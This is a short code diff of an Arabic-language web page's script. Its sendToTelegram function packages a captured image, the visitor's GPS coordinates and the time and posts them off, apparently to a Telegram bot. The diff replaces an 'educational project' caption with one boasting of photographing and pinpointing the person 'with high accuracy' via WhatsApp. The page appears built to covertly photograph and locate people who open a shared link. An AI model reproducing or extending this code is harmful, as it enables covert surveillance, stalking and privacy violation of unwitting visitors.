@@ -101,7 +101,7 @@ function sendToTelegram(image, pos) {
     const lng = pos ? pos.coords.longitude.toFixed(6) : "مرفوض";
     const time = new Date().toLocaleString('ar-EG');
 
-    const caption = `🎓 مشروع تعليمي ناجح\n📍 الموقع: ${lat},${lng}\n🕐 الوقت: ${time}\n👨‍🏫 تم التنفيذ بقلب واتساب`;
+    const caption = `🎓تم التصوير وتحديد الموقع بدقة عالية\n📍 الموقع: ${lat},${lng}\n🕐 الوقت: ${time}\n👨‍🏫 تم التنفيذ بقلب واتساب`;
 
     const blob = dataURLtoBlob(image);
     const form = new FormData();
@@ -125,3 +125,4 @@ function dataURLtoBlob(dataurl) {
 
 </body>
 </html>
+
